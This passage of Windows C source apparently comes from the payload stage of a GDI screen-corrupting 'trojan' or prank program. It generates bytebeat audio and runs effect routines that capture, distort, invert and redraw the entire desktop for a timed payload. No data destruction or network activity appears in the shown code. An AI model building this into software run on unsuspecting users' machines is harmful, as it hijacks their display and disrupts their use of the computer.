		INT piOrder[ SYNTH_LENGTH ];
		INT nRandIndex;
		INT nNumber;

		for ( INT i = 0; i < SYNTH_LENGTH; i++ )
		{
			piOrder[ i ] = i;
		}

		for ( INT i = 0; i < SYNTH_LENGTH; i++ )
		{
			nRandIndex = Xorshift32( ) % 16;
			nNumber = piOrder[ nRandIndex ];
			piOrder[ nRandIndex ] = piOrder[ i ];
			piOrder[ i ] = nNumber;
		}

		for ( INT i = 0; i < SYNTH_LENGTH; i++ )
		{
			ExecuteAudioSequence(
				pAudioSequences[ i ].nSamplesPerSec,
				pAudioSequences[ i ].nSampleCount,
				pAudioSequences[ i ].pAudioSequence,
				pAudioSequences[ i ].pPreAudioOp,
				pAudioSequences[ i ].pPostAudioOp );
		}
	}
}

VOID
WINAPI
AudioSequenceThread(
	_In_ PAUDIO_SEQUENCE_PARAMS pAudioParams
)
{
	ExecuteAudioSequence(
		pAudioParams->nSamplesPerSec,
		pAudioParams->nSampleCount,
		pAudioParams->pAudioSequence,
		pAudioParams->pPreAudioOp,
		pAudioParams->pPostAudioOp );
}

VOID
WINAPI
ExecuteAudioSequence(
	_In_ INT nSamplesPerSec,
	_In_ INT nSampleCount,
	_In_ AUDIO_SEQUENCE pAudioSequence,
	_In_opt_ AUDIOSEQUENCE_OPERATION pPreAudioOp,
	_In_opt_ AUDIOSEQUENCE_OPERATION pPostAudioOp
)
{
	HANDLE hHeap = GetProcessHeap( );
	PSHORT psSamples = HeapAlloc( hHeap, 0, nSampleCount * 2 );
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec * 2, 2, 16, 0 };
	WAVEHDR waveHdr = { ( PCHAR )psSamples, nSampleCount * 2, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen( &hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0 );

	if ( pPreAudioOp )
	{
		pPreAudioOp( nSamplesPerSec );
	}
	
	pAudioSequence( nSamplesPerSec, nSampleCount, psSamples );

	if ( pPostAudioOp )
	{
		pPostAudioOp( nSamplesPerSec );
	}

	waveOutPrepareHeader( hWaveOut, &waveHdr, sizeof( waveHdr ) );
	waveOutWrite( hWaveOut, &waveHdr, sizeof( waveHdr ) );

	Sleep( nSampleCount * 1000 / nSamplesPerSec );

	while ( !( waveHdr.dwFlags & WHDR_DONE ) )
	{
		Sleep( 1 );
	}

	waveOutReset( hWaveOut );
	waveOutUnprepareHeader( hWaveOut, &waveHdr, sizeof( waveHdr ) );
	HeapFree( hHeap, 0, psSamples );
}

VOID
WINAPI
AudioSequence1(
	_In_ INT nSamplesPerSec,
	_In_ INT nSampleCount,
	_Inout_ PSHORT psSamples
)
{
	for ( INT t = 0; t < nSampleCount; t++ )
	{
		INT nFreq = ( INT )( FastSine( ( FLOAT )t / 10.f ) * 100.f + 500.f );
		FLOAT fSine = FastSine( ( FLOAT )t / 10.f ) * ( FLOAT )nSamplesPerSec;
		psSamples[ t ] = ( SHORT )( TriangleWave( t, nFreq, ( FLOAT )nSamplesPerSec * 5.f + fSine ) * ( FLOAT )SHRT_MAX * .1f ) +
			( SHORT )( SquareWave( t, nFreq, nSampleCount ) * ( FLOAT )SHRT_MAX * .2f );
	}
}

VOID
WINAPI
AudioSequence2(
	_In_ INT nSamplesPerSec,
	_In_ INT nSampleCount,
	_Inout_ PSHORT psSamples
)
{
	UNREFERENCED_PARAMETER( nSamplesPerSec );

	for ( INT t = 0; t < nSampleCount * 2; t++ )
	{
		BYTE bFreq = ( BYTE )( ( t | t % 255 | t % 257 ) + ( t & t >> 8 ) + ( t * ( 42 & t >> 10 ) ) + ( ( t % ( ( t >> 8 | t >> 16 ) + 1 ) ) ^ t ) );
		( ( BYTE * )psSamples )[ t ] = bFreq;
	}
}

VOID
WINAPI
AudioSequence3(
	_In_ INT nSamplesPerSec,
	_In_ INT nSampleCount,
	_Inout_ PSHORT psSamples
)
{
	UNREFERENCED_PARAMETER( nSamplesPerSec );

	INT nCubeRoot = ( INT )cbrtf( ( FLOAT )nSampleCount ) + 1;
	for ( INT z = 0; z < nCubeRoot; z++ )
	{
		for ( INT y = 0; y < nCubeRoot; y++ )
		{
			for ( INT x = 0; x < nCubeRoot; x++ )
			{
				INT nIndex = z * nCubeRoot * nCubeRoot + y * nCubeRoot + x;
				if ( nIndex >= nSampleCount )
					continue;

				INT nFreq = ( INT )( ( FLOAT )( y & z & x ) * FastSine( ( FLOAT )( z * y * x ) / 100.f ) );
				psSamples[ nIndex ] =
					( SHORT )( SquareWave( y + z * x, ( nFreq % 500 ) + 1000, nSamplesPerSec ) * ( FLOAT )SHRT_MAX * .3f ) +
					( SHORT )( SawtoothWave( x | z, ( 150 - ( nFreq % 200 ) / 4 ) + 800, nSamplesPerSec ) * ( FLOAT )SHRT_MAX * .3f ) +
					( SHORT )( TriangleWave( ( FLOAT )( x & y & z ) + ( SquareWave( x + y, nFreq % 50, nSamplesPerSec ) * nSamplesPerSec ),
						( nFreq % 50 ) / 10 + 50, nSamplesPerSec ) * ( FLOAT )SHRT_MAX * .3f );
			}
		}
	}
}

VOID
WINAPI
AudioSequence4(
	_In_ INT nSamplesPerSec,
	_In_ INT nSampleCount,
	_Inout_ PSHORT psSamples
)
{
	UNREFERENCED_PARAMETER( nSamplesPerSec );

	for ( INT t = 0; t < nSampleCount; t++ )
	{
		INT nFreq = ( INT )( FastSine( ( FLOAT )t / ( 1000.f - t / ( nSampleCount / 1000 ) ) ) * 100.f + 500.f );
		psSamples[ t ] = ( SHORT )( SquareWave( t, nFreq, nSampleCount ) * ( FLOAT )SHRT_MAX * .1f );
	}
}

VOID
WINAPI
AudioSequence5(
	_In_ INT nSamplesPerSec,
	_In_ INT nSampleCount,
	_Inout_ PSHORT psSamples
)
{
	UNREFERENCED_PARAMETER( nSamplesPerSec );

	for ( INT t = 0; t < nSampleCount; t++ )
	{
		SHORT sFreq = ( SHORT )( t * ( t >> ( t >> 13 & t ) ) );
		psSamples[ t ] = sFreq;
	}
}

VOID
WINAPI
AudioSequence6(
	_In_ INT nSamplesPerSec,
	_In_ INT nSampleCount,
	_Inout_ PSHORT psSamples
)
{
	UNREFERENCED_PARAMETER( nSamplesPerSec );

	for ( INT t = 0; t < nSampleCount * 2; t++ )
	{
		BYTE bFreq = ( BYTE )( ( t & ( ( t >> 18 ) + ( ( t >> 11 ) & t ) ) ) * t + ( ( ( t >> 8 & t ) - ( t >> 3 & t >> 8 | t >> 16 ) ) & 128 ) );
		( ( BYTE * )psSamples )[ t ] = bFreq;
	}
}

VOID
WINAPI
AudioSequence7(
	_In_ INT nSamplesPerSec,
	_In_ INT nSampleCount,
	_Inout_ PSHORT psSamples
)
{
	UNREFERENCED_PARAMETER( nSamplesPerSec );

	for ( INT t = 0; t < nSampleCount * 2; t++ )
	{
		BYTE bFreq = ( BYTE )( ( ( t >> 12 & t >> 8 ) >> ( t >> 20 & t >> 12 ) ) * t );
		( ( BYTE * )psSamples )[ t ] = bFreq;
	}
}

VOID
WINAPI
AudioSequence8(
	_In_ INT nSamplesPerSec,
	_In_ INT nSampleCount,
	_Inout_ PSHORT psSamples
)
{
	UNREFERENCED_PARAMETER( nSamplesPerSec );

	SHORT sRand = ( SHORT )Xorshift32( );
	for ( INT t = 0; t < nSampleCount; t++ )
	{
		INT nRand = ( nSampleCount - t * 2 ) / 512;
		if ( nRand < 24 )
			nRand = 24;
		if ( !( Xorshift32( ) % nRand ) )
		{
			sRand = ( SHORT )Xorshift32( );
		}
		psSamples[ t ] = ( SHORT )( SawtoothWave(t, sRand, nSampleCount) * ( FLOAT )SHRT_MAX * .1f )
			& ~sRand | ( ( SHORT )Xorshift32( ) >> 12 ) +
			( SHORT )( SineWave( Xorshift32( ) % nSampleCount, nRand ^ sRand, nSampleCount ) * ( FLOAT )SHRT_MAX * .1f ) +
			( SHORT )( TriangleWave( t, 3000, nSampleCount ) * ( FLOAT )SHRT_MAX );
	}
}

VOID
WINAPI
AudioSequence9(
	_In_ INT nSamplesPerSec,
	_In_ INT nSampleCount,
	_Inout_ PSHORT psSamples
)
{
	UNREFERENCED_PARAMETER( nSamplesPerSec );

	INT nSquareRoot = ( INT )sqrtf( ( FLOAT )nSampleCount ) + 1;
	for ( INT y = 0; y < nSquareRoot; y++ )
	{
		for ( INT x = 0; x < nSquareRoot; x++ )
		{
			INT nIndex = y * nSquareRoot + x;
			if ( nIndex >= nSampleCount )
				continue;

			INT nFreq = ( INT )( ( FLOAT )( y | x ) * FastSine( ( FLOAT )( y * x ) / 1000.f ) );
			psSamples[ nIndex ] =
				( SHORT )( SquareWave( y & x, ( nFreq % 500 ) + 1000, nSamplesPerSec ) * ( FLOAT )SHRT_MAX * .3f );
		}
	}
}

VOID
WINAPI
AudioSequence10(
	_In_ INT nSamplesPerSec,
	_In_ INT nSampleCount,
	_Inout_ PSHORT psSamples
)
{
	UNREFERENCED_PARAMETER( nSamplesPerSec );

	for ( INT t = 0; t < nSampleCount * 2; t++ )
	{
		FLOAT w = powf( 2.f, ( FLOAT )( t >> 8 & t >> 13 ) );
		BYTE bFreq = ( BYTE )( ( t << ( ( t >> 1 | t >> 8 ) ^ ( t >> 13 ) ) | ( t >> 8 & t >> 16 ) * t >> 4 ) + ( ( t * ( t >> 7 | t >> 10 ) ) >> ( t >> 18 & t ) ) + ( t * t ) / ( ( t ^ t >> 12 ) + 1 ) + ( ( 128 / ( ( BYTE )w + 1 ) & t ) > 1 ? ( BYTE )w * t : -( BYTE )w * ( t + 1 ) ) );
		( ( BYTE * )psSamples )[ t ] = bFreq;
	}
}

VOID
WINAPI
AudioSequence11(
	_In_ INT nSamplesPerSec,
	_In_ INT nSampleCount,
	_Inout_ PSHORT psSamples
)
{
	UNREFERENCED_PARAMETER( nSamplesPerSec );

	for ( INT t = 0; t < nSampleCount * 2; t++ )
	{
		BYTE bFreq = ( BYTE )( ( t * ( ( t >> 8 & t >> 3 ) >> ( t >> 16 & t ) ) ) + ( ( t * ( t >> 8 & t >> 3 ) ) >> ( t >> 16 & t ) ) );
		( ( BYTE * )psSamples )[ t ] = bFreq;
	}
}

VOID
WINAPI
AudioSequence12(
	_In_ INT nSamplesPerSec,
	_In_ INT nSampleCount,
	_Inout_ PSHORT psSamples
)
{
	UNREFERENCED_PARAMETER( nSamplesPerSec );

	for ( INT t = 0; t < nSampleCount; t++ )
	{
		psSamples[ t ] = ( SHORT )( TriangleWave( __rdtsc( ) % 8, 1500, nSampleCount ) * ( FLOAT )SHRT_MAX * .3f ) |
			( SHORT )( SquareWave( __rdtsc( ) % 8, 1000, nSampleCount ) * ( FLOAT )SHRT_MAX * .3f ) + ( SHORT )~t + ( ( SHORT )t >> 2 );
	}
}

VOID
WINAPI
AudioSequence13(
	_In_ INT nSamplesPerSec,
	_In_ INT nSampleCount,
	_Inout_ PSHORT psSamples
)
{
	UNREFERENCED_PARAMETER( nSamplesPerSec );

	for ( INT t = 0; t < nSampleCount; t++ )
	{
		psSamples[ t ] = ( SHORT )( SawtoothWave( __rdtsc( ) % 1500, 1500, nSampleCount ) * ( FLOAT )SHRT_MAX * .3f ) ^
			( ( SHORT )( SawtoothWave( t % 10, t % 1000, nSampleCount ) * ( FLOAT )SHRT_MAX * .1f ) >> 8 );
	}
}

VOID
WINAPI
AudioSequence14(
	_In_ INT nSamplesPerSec,
	_In_ INT nSampleCount,
	_Inout_ PSHORT psSamples
)
{
	UNREFERENCED_PARAMETER( nSamplesPerSec );

	INT nSquareRoot = ( INT )sqrtf( ( FLOAT )nSampleCount ) + 1;
	for ( INT y = 0; y < nSquareRoot; y++ )
	{
		for ( INT x = 0; x < nSquareRoot; x++ )
		{
			INT nIndex = y * nSquareRoot + x;
			if ( nIndex >= nSampleCount )
				continue;

			INT nFreq = ( INT )( ( FLOAT )( y | x ) * FastCosine( ( FLOAT )( y & x ) / 10.f ) );
			psSamples[ nIndex ] = ( SHORT )( SineWave( y + x, ( nFreq % 1000 ) + 1000, nSamplesPerSec ) * ( FLOAT )SHRT_MAX * .3f );
		}
	}
}

VOID
WINAPI
AudioSequence15(
	_In_ INT nSamplesPerSec,
	_In_ INT nSampleCount,
	_Inout_ PSHORT psSamples
)
{
	UNREFERENCED_PARAMETER( nSamplesPerSec );

	INT nSquareRoot = ( INT )sqrtf( ( FLOAT )nSampleCount ) + 1;
	for ( INT y = 0; y < nSquareRoot; y++ )
	{
		for ( INT x = 0; x < nSquareRoot; x++ )
		{
			INT nIndex = y * nSquareRoot + x;
			if ( nIndex >= nSampleCount )
				continue;

			INT nFreq = ( INT )( ( FLOAT )( y - x ) * FastCosine( ( FLOAT )( y * x ) / 10.f ) );
			psSamples[ nIndex ] = ( SHORT )( SineWave( y % ( x + 1 ), ( nFreq % 100 ) + 100, nSamplesPerSec ) * ( FLOAT )SHRT_MAX * .3f );
		}
	}
}

VOID
WINAPI
AudioSequence16(
	_In_ INT nSamplesPerSec,
	_In_ INT nSampleCount,
	_Inout_ PSHORT psSamples
)
{
	UNREFERENCED_PARAMETER( nSamplesPerSec );

	INT nSquareRoot = ( INT )sqrtf( ( FLOAT )nSampleCount ) + 1;
	for ( INT y = 0; y < nSquareRoot; y++ )
	{
		for ( INT x = 0; x < nSquareRoot; x++ )
		{
			INT nIndex = y * nSquareRoot + x;
			if ( nIndex >= nSampleCount )
				continue;

			INT nFreq = ( INT )( ( FLOAT )( y ^ x ) * exp( cosh ( atanf( ( FLOAT )( y | x ) ) / 10.f ) ) * 2.f );
			psSamples[ nIndex ] = ( SHORT )( SineWave( y - ( x % ( y + 1 ) ), ( nFreq % 100 ) + 500, nSamplesPerSec ) * ( FLOAT )SHRT_MAX * .3f );
		}
	}
}

VOID
WINAPI
FinalAudioSequence(
	_In_ INT nSamplesPerSec,
	_In_ INT nSampleCount,
	_Inout_ PSHORT psSamples
)
{
	UNREFERENCED_PARAMETER( nSamplesPerSec );

	INT nCubeRoot = ( INT )cbrtf( ( FLOAT )nSampleCount ) + 1;
	for ( INT z = 0; z < nCubeRoot; z++ )
	{
		for ( INT y = 0; y < nCubeRoot; y++ )
		{
			for ( INT x = 0; x < nCubeRoot; x++ )
			{
				INT nIndex = z * nCubeRoot * nCubeRoot + y * nCubeRoot + x;
				if ( nIndex >= nSampleCount )
					continue;

				INT nFreq = ( INT )( ( FLOAT )( y & x ) * sinf( ( FLOAT )z / ( FLOAT )nCubeRoot + ( FLOAT )x + ( FLOAT )nCounter * ( FLOAT )y ) * 2.f );
				psSamples[ nIndex ] = ( SHORT )( SquareWave( nIndex, nFreq, nSamplesPerSec ) * ( FLOAT )( SHRT_MAX ) * .3f );
			}
		}
	}
}

VOID
WINAPI
GdiShaderThread(
	_In_ PGDISHADER_PARAMS pGdiShaderParams
)
{
	if ( pGdiShaderParams->pGdiShader == GdiShader3 )
	{
		nShaderThreeSeed = Xorshift32( );
	}

	ExecuteGdiShader( hdcDesktop, rcScrBounds, PAYLOAD_TIME, 5, pGdiShaderParams->pGdiShader,
		pGdiShaderParams->pPreGdiShader, pGdiShaderParams->pPostGdiShader );
}

VOID
WINAPI
ExecuteGdiShader(
	_In_ HDC hdcDst,
	_In_ RECT rcBounds,
	_In_ INT nTime,
	_In_ INT nDelay,
	_In_ GDI_SHADER pGdiShader,
	_In_opt_ GDI_SHADER_OPERATION pPreGdiShader,
	_In_opt_ GDI_SHADER_OPERATION pPostGdiShader
)
{
	BITMAPINFO bmi = { 0 };
	PRGBQUAD prgbSrc, prgbDst;
	HANDLE hHeap;
	HDC hdcTemp;
	HBITMAP hbmTemp;
	SIZE_T nSize;
	INT nWidth;
	INT nHeight;

	nWidth = rcBounds.right - rcBounds.left;
	nHeight = rcBounds.bottom - rcBounds.top;
	nSize = nWidth * nHeight * sizeof( COLORREF );

	bmi.bmiHeader.biSize = sizeof( BITMAPINFO );
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = nWidth;
	bmi.bmiHeader.biHeight = nHeight;
	
	hHeap = GetProcessHeap( );
	prgbSrc = ( PRGBQUAD )HeapAlloc( hHeap, 0, nSize );

	hdcTemp = CreateCompatibleDC( hdcDst );
	hbmTemp = CreateDIBSection( hdcDst, &bmi, 0, &prgbDst, NULL, 0 );
	SelectObject( hdcTemp, hbmTemp );

	for ( INT i = 0, j = nCounter; ( j + nTime ) > nCounter; i++ )
	{
		if ( pPreGdiShader == NULL )
		{
			BitBlt( hdcTemp, 0, 0, nWidth, nHeight, hdcDst, rcBounds.left, rcBounds.top, SRCCOPY );
		}
		else
		{
			pPreGdiShader( i, nWidth, nHeight, rcBounds, hdcDst, hdcTemp );
		}

		RtlCopyMemory( prgbSrc, prgbDst, nSize );

		pGdiShader( i, nWidth, nHeight, hdcDst, hbmTemp, prgbSrc, prgbDst );

		if ( pPostGdiShader == NULL )
		{
			BitBlt( hdcDst, rcBounds.left, rcBounds.top, nWidth, nHeight, hdcTemp, 0, 0, SRCCOPY );
		}
		else
		{
			pPostGdiShader( i, nWidth, nHeight, rcBounds, hdcDst, hdcTemp );
		}

		if ( nDelay )
		{
			Sleep( nDelay );
		}
	}
	
	HeapFree( hHeap, 0, prgbSrc );
	DeleteObject( hbmTemp );
	DeleteDC( hdcTemp );
}

VOID
WINAPI
GdiShader1(
	_In_ INT t,
	_In_ INT w,
	_In_ INT h,
	_In_ HDC hdcTemp,
	_In_ HBITMAP hbmTemp,
	_In_ PRGBQUAD prgbSrc,
	_Inout_ PRGBQUAD prgbDst
)
{
	UNREFERENCED_PARAMETER( hdcTemp );
	UNREFERENCED_PARAMETER( hbmTemp );

	UINT u;
	UINT v;
	FLOAT div = ( FLOAT )t / 30.f;
	FLOAT a = FastSine( div ) * 5.f;
	FLOAT b = FastCosine( div ) * 5.f;
	RGBQUAD rgbDst;

	for ( INT y = 0; y < h; y++ )
	{
		for ( INT x = 0; x < w; x++ )
		{
			u = x + ( INT )a, v = y + ( INT )b;
			u %= w;
			v %= h;

			rgbDst = prgbSrc[ v * w + u ];
			rgbDst.r += ~prgbSrc[ y * w + x ].r / 32;
			rgbDst.g += ~prgbSrc[ y * w + x ].g / 32;
			rgbDst.b += ~prgbSrc[ y * w + x ].b / 32;
			prgbDst[ y * w + x ] = rgbDst;
		}
	}
}

VOID
WINAPI
PostGdiShader1(
	_In_ INT t,
	_In_ INT w,
	_In_ INT h,
	_In_ RECT rcBounds,
	_In_ HDC hdcDst,
	_In_ HDC hdcTemp
)
{
	if ( !( t % 256 ) )
	{
		RedrawWindow( NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN );
	}
	else
	{
		BitBlt( hdcDst, rcBounds.left, rcBounds.top, w, h, hdcTemp, 0, 0, SRCCOPY );
	}
}

VOID
WINAPI
GdiShader2(
	_In_ INT t,
	_In_ INT w,
	_In_ INT h,
	_In_ HDC hdcTemp,
	_In_ HBITMAP hbmTemp,
	_In_ PRGBQUAD prgbSrc,
	_Inout_ PRGBQUAD prgbDst
)
{
	UNREFERENCED_PARAMETER( hdcTemp );
	UNREFERENCED_PARAMETER( hbmTemp );

	UINT u;
	UINT v;
	RGBQUAD rgbDst;

	for ( INT y = 0; y < h; y++ )
	{
		FLOAT _y = ( FLOAT )y / 20.f;

		for ( INT x = 0; x < w; x++ )
		{
			FLOAT div = ( FLOAT )t / 4.f;
			FLOAT a = FastSine( div + _y ) * 10.f;
			FLOAT b = FastCosine( div + ( FLOAT )x / 20.f ) * 40.f;

			u = x + ( INT )a, v = y + ( INT )b;
			u %= w;
			v %= h;

			rgbDst = prgbSrc[ y * w + u ];

			DWORD rgb = prgbSrc[ v * w + x ].rgb / ( ( 0x101010 | ( t & y ) | ( ( t & x ) << 8 ) | ( t << 16 ) ) + 1);
			if ( !rgb )
			{
				rgb = 2;
			}

			rgbDst.rgb /= rgb;
			if ( !rgbDst.rgb )
			{
				rgbDst.rgb = 0xFFFFFF;
			}

			prgbDst[ y * w + x ] = rgbDst;
		}
	}
}

VOID
WINAPI
PostGdiShader2(
	_In_ INT t,
	_In_ INT w,
	_In_ INT h,
	_In_ RECT rcBounds,
	_In_ HDC hdcDst,
	_In_ HDC hdcTemp
)
{
	if ( !( t % 16 ) )
	{
		RedrawWindow( NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN );
	}
	else
	{
		BitBlt( hdcDst, rcBounds.left, rcBounds.top, w, h, hdcTemp, 0, 0, SRCCOPY );
	}
}

VOID
WINAPI
GdiShader3(
	_In_ INT t,
	_In_ INT w,
	_In_ INT h,
	_In_ HDC hdcTemp,
	_In_ HBITMAP hbmTemp,
	_In_ PRGBQUAD prgbSrc,
	_Inout_ PRGBQUAD prgbDst
)
{
	UNREFERENCED_PARAMETER( hdcTemp );
	UNREFERENCED_PARAMETER( hbmTemp );

	UINT u;
	UINT v;
	RGBQUAD rgbDst;
	HSLCOLOR hsl;
	FLOAT _t = ( FLOAT )t / 10.f;

	for ( INT y = 0; y < h; y++ )
	{
		FLOAT _y = ( FLOAT )y / 25.f;

		for ( INT x = 0; x < w; x++ )
		{
			FLOAT a = FastCosine( _y + _t ) * 16.f;

			u = x + ( INT )a, v = y;
			u %= w;
			v %= h;

			rgbDst = prgbSrc[ v * w + u ];
			FLOAT f = 1.f / 8.f;
			FLOAT r = ( FLOAT )prgbSrc[ y * w + x ].r * f + ( FLOAT )rgbDst.r * ( 1.f - f );
			FLOAT g = ( FLOAT )prgbSrc[ y * w + x ].g * f + ( FLOAT )rgbDst.g * ( 1.f - f );
			FLOAT b = ( FLOAT )prgbSrc[ y * w + x ].b * f + ( FLOAT )rgbDst.b * ( 1.f - f );

			rgbDst.rgb = ( ( BYTE )b | ( ( BYTE )g << 8 ) | ( ( BYTE )r << 16 ) );
			hsl = RGBToHSL( rgbDst );
			hsl.h = ( FLOAT )fmod( ( DOUBLE )hsl.h + 1.0 / 45.0 + ( ( FLOAT )x + ( FLOAT )y ) / ( ( ( FLOAT )w + ( FLOAT )h ) * 64.f ), 1.0 );
			prgbDst[ y * w + x ] = HSLToRGB( hsl );
		}
	}
}

VOID
WINAPI
PostGdiShader3(
	_In_ INT t,
	_In_ INT w,
	_In_ INT h,
	_In_ RECT rcBounds,
	_In_ HDC hdcDst,
	_In_ HDC hdcTemp
)
{
	INT x, y;
	HBRUSH hbrBall;
	HPEN hpenBall;

	BitBlt( hdcDst, rcBounds.left, rcBounds.top, w, h, hdcTemp, 0, 0, SRCCOPY );

	t += nShaderThreeSeed;
	x = t * 16;
	y = t * 16;
	
	for ( INT i = 64; i > 8; i -= 8 )
	{
		hbrBall = CreateSolidBrush( 0x0000FF );
		hpenBall = CreatePen( PS_SOLID, 2, 0xFFFFFF );

		SelectObject( hdcDst, hbrBall );
		SelectObject( hdcDst, hpenBall );
		Reflect2D( &x, &y, w, h );
		Ellipse( hdcDst, x + rcBounds.left - i, y + rcBounds.top - i, x + rcBounds.left + i, y + rcBounds.top + i );
		DeleteObject( hbrBall );
		DeleteObject( hpenBall );
	}
}

VOID
WINAPI
GdiShader4(
	_In_ INT t,
	_In_ INT w,
	_In_ INT h,
	_In_ HDC hdcTemp,
	_In_ HBITMAP hbmTemp,
	_In_ PRGBQUAD prgbSrc,
	_Inout_ PRGBQUAD prgbDst
)
{
	UNREFERENCED_PARAMETER( hdcTemp );
	UNREFERENCED_PARAMETER( hbmTemp );

	UINT u;
	UINT v;
	RGBQUAD rgbDst;
	RGBQUAD rgbSrc;
	FLOAT _t = ( FLOAT )t / 5000.f;
	FLOAT a = ( FLOAT )t / 50.f;
	FLOAT b = FastSine( a ) * _t;
	FLOAT c = FastCosine( a ) * _t;
	FLOAT centerX = ( FLOAT )w / 2;
	FLOAT centerY = ( FLOAT )h / 2;

	while ( b < 0.f )
	{
		b += PI * 2.f;
	}

	while ( c < 0.f )
	{
		c += PI * 2.f;
	}

	for ( INT y = 0; y < h; y++ )
	{
		for ( INT x = 0; x < w; x++ )
		{
			u = ( UINT )( ( x - centerX ) * FastCosine( b ) - ( y - centerY ) * FastSine( c ) + centerX );
			v = ( UINT )( ( x - centerX ) * FastSine( c ) + ( y - centerY ) * FastCosine( b ) + centerY );

			Reflect2D( ( PINT )&u, ( PINT )&v, w, h );

			rgbDst = prgbSrc[ v * w + u ];
			rgbSrc = prgbSrc[ y * w + x ];
			rgbDst.rgb ^= rgbSrc.rgb;

			if ( ( t / 32 ) % 2 )
			{
				rgbDst.rgb = ~rgbDst.rgb;
			}

			prgbDst[ y * w + x ] = rgbDst;
		}
	}
}

VOID
WINAPI
GdiShader5(
	_In_ INT t,
	_In_ INT w,
	_In_ INT h,
	_In_ HDC hdcTemp,
	_In_ HBITMAP hbmTemp,
	_In_ PRGBQUAD prgbSrc,
	_Inout_ PRGBQUAD prgbDst
)
{
	UNREFERENCED_PARAMETER( hdcTemp );
	UNREFERENCED_PARAMETER( hbmTemp );

	UINT u;
	UINT v;
	RGBQUAD rgbDst;
	RGBQUAD rgbSrc;

	for ( INT y = 0; y < h; y++ )
	{
		for ( INT x = 0; x < w; x++ )
		{
			u = ~( ( x + t ) & y );
			v = ~( ( y + t ) & x );

			u %= w;
			v %= h;

			rgbDst = prgbSrc[ v * w + u ];
			rgbSrc = prgbSrc[ y * w + x ];
			rgbDst.rgb ^= rgbSrc.rgb;

			prgbDst[ y * w + x ] = rgbDst;
		}
	}
}

VOID
WINAPI
PostGdiShader4(
	_In_ INT t,
	_In_ INT w,
	_In_ INT h,
	_In_ RECT rcBounds,
	_In_ HDC hdcDst,
	_In_ HDC hdcTemp
)
{
	UNREFERENCED_PARAMETER( hdcDst );
	UNREFERENCED_PARAMETER( hdcTemp );

	BitBlt( hdcDst, rcBounds.left, rcBounds.top, w, h, hdcTemp, 0, 0, SRCCOPY );

	if ( !( t % 8 ) )
	{
		RedrawWindow( NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN );
	}
}

VOID
WINAPI
GdiShader6(
	_In_ INT t,
	_In_ INT w,
	_In_ INT h,
	_In_ HDC hdcTemp,
	_In_ HBITMAP hbmTemp,
	_In_ PRGBQUAD prgbSrc,
	_Inout_ PRGBQUAD prgbDst
)
{
	UNREFERENCED_PARAMETER( hdcTemp );
	UNREFERENCED_PARAMETER( hbmTemp );

	UINT u;
	UINT v;
	FLOAT div = ( FLOAT )t / 20.f;
	FLOAT a = FastCosine( div ) * 2.f * PI;
	BOOL bShiftDir = ( BOOL )( Xorshift32( ) & 1 );
	BYTE bChannels = ( BYTE )( Xorshift32( ) & 0b111 );
	RGBQUAD rgbSrc;
	RGBQUAD rgbDst;

	for ( INT y = 0; y < h; y++ )
	{
		for ( INT x = 0; x < w; x++ )
		{
			FLOAT b = ( FLOAT )( x + y + t * 32 ) / 100.f;
			FLOAT c = FastSine( a + b ) * 10.f;
			
			u = x + ( INT )a, v = y + ( INT )c;
			Reflect2D( ( PINT )&u, ( PINT )&v, w, h );

			rgbDst = prgbSrc[ v * w + x ];

			if ( bShiftDir )
			{
				rgbDst.rgb <<= 1;
			}
			else
			{
				rgbDst.rgb >>= 1;
			}

			rgbSrc = prgbSrc[ v * w + x ];
			rgbDst.rgb ^= rgbSrc.rgb;
			
			if ( bChannels & 0b001 )
			{
				rgbDst.b |= rgbSrc.b;
			}

			if ( bChannels & 0b010 )
			{
				rgbDst.g |= rgbSrc.g;
			}

			if ( bChannels & 0b100 )
			{
				rgbDst.r |= rgbSrc.r;
			}

			prgbDst[ y * w + u ] = rgbDst;
		}
	}
}

VOID
WINAPI
GdiShader7(
	_In_ INT t,
	_In_ INT w,
	_In_ INT h,
	_In_ HDC hdcTemp,
	_In_ HBITMAP hbmTemp,
	_In_ PRGBQUAD prgbSrc,
	_Inout_ PRGBQUAD prgbDst
)
{
	UNREFERENCED_PARAMETER( hdcTemp );
	UNREFERENCED_PARAMETER( hbmTemp );

	UINT u;
	UINT v;
	RGBQUAD rgbDst;
	RGBQUAD rgbSrc;
	BOOL bOperation = ( BOOL )( Xorshift32( ) % 3 );

	for ( INT y = 0; y < h; y++ )
	{
		for ( INT x = 0; x < w; x++ )
		{
			u = ( x + t * 2 ) ^ ( y + t * 8 ) ^ t;
			v = ( x + t * 8 ) + ( y + t * 2 ) ^ t;

			u %= w;
			v %= h;

			rgbDst = prgbSrc[ v * w + u ];
			rgbSrc = prgbSrc[ y * w + x ];

			if ( bOperation )
			{
				rgbDst.rgb |= rgbSrc.rgb;
			}
			else
			{
				rgbDst.rgb &= rgbSrc.rgb;
			}

			prgbDst[ y * w + x ] = rgbDst;
		}
	}
}

VOID
WINAPI
PostGdiShader5(
	_In_ INT t,
	_In_ INT w,
	_In_ INT h,
	_In_ RECT rcBounds,
	_In_ HDC hdcDst,
	_In_ HDC hdcTemp
)
{
	if ( !( t % 4 ) )
	{
		RedrawWindow( NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN );
	}
	else
	{
		BitBlt( hdcDst, rcBounds.left, rcBounds.top, w, h, hdcTemp, 0, 0, NOTSRCCOPY );
	}
}

VOID
WINAPI
PreGdiShader1(
	_In_ INT t,
	_In_ INT w,
	_In_ INT h,
	_In_ RECT rcBounds,
	_In_ HDC hdcDst,
	_In_ HDC hdcTemp
)
{
	UNREFERENCED_PARAMETER( t );

	BitBlt( hdcTemp, 0, 0, w, h, hdcDst, rcBounds.left, rcBounds.top, SRCCOPY );

	for ( INT i = 0; i < 5; i++ )
	{
		INT nBlockSize = Xorshift32( ) % 129 + 128;
		INT nNewBlockSize = nBlockSize + ( Xorshift32( ) % 17 + 16 );
		INT x = Xorshift32( ) % ( w - nBlockSize );
		INT y = Xorshift32( ) % ( h - nBlockSize );

